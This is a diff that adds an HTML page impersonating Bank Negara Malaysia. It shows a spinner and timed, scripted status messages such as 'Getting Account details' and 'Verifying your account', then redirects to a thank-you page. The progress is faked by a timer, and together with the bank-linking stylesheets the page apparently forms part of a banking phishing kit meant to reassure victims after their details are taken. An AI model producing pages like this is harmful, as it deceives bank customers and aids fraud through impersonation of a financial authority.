@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="15; url = /success/Thank-You">
+    <title>Success!</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+    <link rel="stylesheet" href="/static/bootstrap-4.5.0-dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/css/plaid.css">
+    <link rel="stylesheet" href="/static/css/maybank.css">
+    <script src="https://use.fontawesome.com/b630a46cc5.js"></script>
+</head>
+
+<body style="background-color: #0383e0" onload="linking_acc()">
+
+    <div class="container">
+        <section name='header' style="margin-bottom: 50px;">
+            <div class="select-your-bank bnegara" style="text-align: center; color: white;">
+                <img src="/static/images/transparentLogo.png" width='40%' alt="">
+                <h5 style="margin: 0;">BANK NEGARA MALAYSIA</h5>
+                <a style="font-size: smaller;">CENTRAL BANK OF MALAYSIA</a>
+            </div>
+        </section>
+
+        <div class="" style="width: 10rem; height: 10rem; margin: auto auto; position: relative;">
+            <div class="spinner-border" style="width: 10rem; height: 10rem; color: white;" role="status">
+
+            </div>
+            <div class="lock" style=" width: 5rem; height: 5rem; position: absolute; top: 25%; left: 38%;">
+                <span style="color: white; font-size: 50px; text-align: center;"><i class="fa fa-lock"></i></span>
+            </div>
+        </div>
+        <div id="load-word">
+            <p id="load-change" style="color: white; padding: 10px; text-align: center; margin-top: 10px;">Please wait while we activate your bank</p>
+        </div>
+
+        <!--
+        <div>
+            <div class="spinner-border" style="width: 10rem; height: 10rem; color: white;" role="status">
+
+            </div>
+
+        </div>
+        <span style="color: white; font-size: 50px; text-align: center;"><i class="fa fa-lock"></i></span> -->
+
+    </div>
+
+    <script>
+        function linking_acc(){
+    var word = document.getElementById('load-change');
+    var time = 1;
+    setInterval(timer, 1000)
+    function timer(){
+        time ++
+        if(time == 2){
+            word.innerHTML = "Getting Account details"
+        }else if(time == 4){
+            word.innerHTML = "Verifying your account"
+        }else if(time == 8){
+            word.innerHTML = "Submitting your request, Please wait......."
+        }
+    }
+}
+    </script>
+
+    <script src="../static/js/plaid.js"></script>
+</body>
+
+</html>
